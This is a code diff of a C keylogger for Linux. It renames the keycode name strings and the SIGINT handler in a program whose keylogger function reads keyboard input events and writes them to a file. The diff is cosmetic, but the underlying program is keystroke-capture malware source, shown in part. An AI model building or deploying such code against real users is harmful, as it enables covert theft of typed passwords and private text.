@@ -8,86 +8,84 @@
 #define NUM_KEYCODES 71
 
 const char *keycodes[] = {
-    "KEY_RESERVED",
-    "KEY_ESC",
-    "KEY_1",
-    "KEY_2",
-    "KEY_3",
-    "KEY_4",
-    "KEY_5",
-    "KEY_6",
-    "KEY_7",
-    "KEY_8",
-    "KEY_9",
-    "KEY_0",
-    "KEY_MINUS",
-    "KEY_EQUAL",
-    "KEY_BACKSPACE",
-    "KEY_TAB",
-    "KEY_Q",
-    "KEY_W",
-    "KEY_E",
-    "KEY_R",
-    "KEY_T",
-    "KEY_Y",
-    "KEY_U",
-    "KEY_I",
-    "KEY_O",
-    "KEY_P",
-    "KEY_LEFTBRACE",
-    "KEY_RIGHTBRACE",
-    "KEY_ENTER",
-    "KEY_LEFTCTRL",
-    "KEY_A",
-    "KEY_S",
-    "KEY_D",
-    "KEY_F",
-    "KEY_G",
-    "KEY_H",
-    "KEY_J",
-    "KEY_K",
-    "KEY_L",
-    "KEY_SEMICOLON",
-    "KEY_APOSTROPHE",
-    "KEY_GRAVE",
-    "KEY_LEFTSHIFT",
-    "KEY_BACKSLASH",
-    "KEY_Z",
-    "KEY_X",
-    "KEY_C",
-    "KEY_V",
-    "KEY_B",
-    "KEY_N",
-    "KEY_M",
-    "KEY_COMMA",
-    "KEY_DOT",
-    "KEY_SLASH",
-    "KEY_RIGHTSHIFT",
-    "KEY_KPASTERISK",
-    "KEY_LEFTALT",
-    "KEY_SPACE",
-    "KEY_CAPSLOCK",
-    "KEY_F1",
-    "KEY_F2",
-    "KEY_F3",
-    "KEY_F4",
-    "KEY_F5",
-    "KEY_F6",
-    "KEY_F7",
-    "KEY_F8",
-    "KEY_F9",
-    "KEY_F10",
-    "KEY_NUMLOCK",
-    "KEY_SCROLLLOCK"
+    "RESERVED",
+    "ESC",
+    "1",
+    "2",
+    "3",
+    "4",
+    "5",
+    "6",
+    "7",
+    "8",
+    "9",
+    "0",
+    "MINUS",
+    "EQUAL",
+    "BACKSPACE",
+    "TAB",
+    "Q",
+    "W",
+    "E",
+    "R",
+    "T",
+    "Y",
+    "U",
+    "I",
+    "O",
+    "P",
+    "LEFTBRACE",
+    "RIGHTBRACE",
+    "ENTER",
+    "LEFTCTRL",
+    "A",
+    "S",
+    "D",
+    "F",
+    "G",
+    "H",
+    "J",
+    "K",
+    "L",
+    "SEMICOLON",
+    "APOSTROPHE",
+    "GRAVE",
+    "LEFTSHIFT",
+    "BACKSLASH",
+    "Z",
+    "X",
+    "C",
+    "V",
+    "B",
+    "N",
+    "M",
+    "COMMA",
+    "DOT",
+    "SLASH",
+    "RIGHTSHIFT",
+    "KPASTERISK",
+    "LEFTALT",
+    "SPACE",
+    "CAPSLOCK",
+    "F1",
+    "F2",
+    "F3",
+    "F4",
+    "F5",
+    "F6",
+    "F7",
+    "F8",
+    "F9",
+    "F10",
+    "NUMLOCK",
+    "SCROLLLOCK"
 };
 
 int loop = 1;
 
-void sigterm_handler(int sig){
+void sigint_handler(int sig){
     loop = 0;
 }
-
-
 
 void keylogger(int keyboard, FILE *writeout){
     int eventSize = sizeof(struct input_event);
@@ -95,7 +93,7 @@ void keylogger(int keyboard, FILE *writeout){
     struct input_event events[NUM_EVENTS];
     int i;
 
-    signal(SIGINT, sigterm_handler);
+    signal(SIGINT, sigint_handler);
 
     while(loop){
         bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);
@@ -116,5 +114,4 @@ void keylogger(int keyboard, FILE *writeout){
 
     close(keyboard);
     fclose(writeout);
-
 }
